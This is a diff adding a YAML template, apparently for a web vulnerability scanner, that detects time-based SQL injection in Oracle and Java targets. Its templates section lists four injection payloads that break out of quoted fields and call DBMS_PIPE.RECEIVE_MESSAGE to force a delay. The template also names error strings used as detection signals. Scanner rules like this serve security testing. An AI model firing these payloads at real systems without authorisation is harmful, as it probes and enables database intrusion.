@@ -1,0 +1,41 @@
+id: "sqli-time-oracle"
+issue_code: sql_injection
+detection_condition: or
+detection_methods:
+  - time_based:
+      sleep: "{{.sleep_time}}"
+      confidence: 85
+  - response_condition:
+      contains: "ORA-"
+      confidence: 90
+  - response_condition:
+      contains: "Oracle"
+      confidence: 85
+  - response_check:
+      check: database_error
+      confidence: 80
+vars:
+  - name: sleep_time
+    value: "{{randomInt 5 8}}"
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: oracle
+    - type: platform
+      value: java
+    - type: scan_mode
+      value: fuzz
+templates:
+  - "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{{.sleep_time}})=1--"
+  - "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{{.sleep_time}})=1--"
+  - "') AND DBMS_PIPE.RECEIVE_MESSAGE('a',{{.sleep_time}})=1--"
+  - "'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{{.sleep_time}}) FROM dual)||'"
+  
+categories:
+  - sql_injection
+  - time_based
+  - oracle
+platforms:
+  - oracle
+  - java
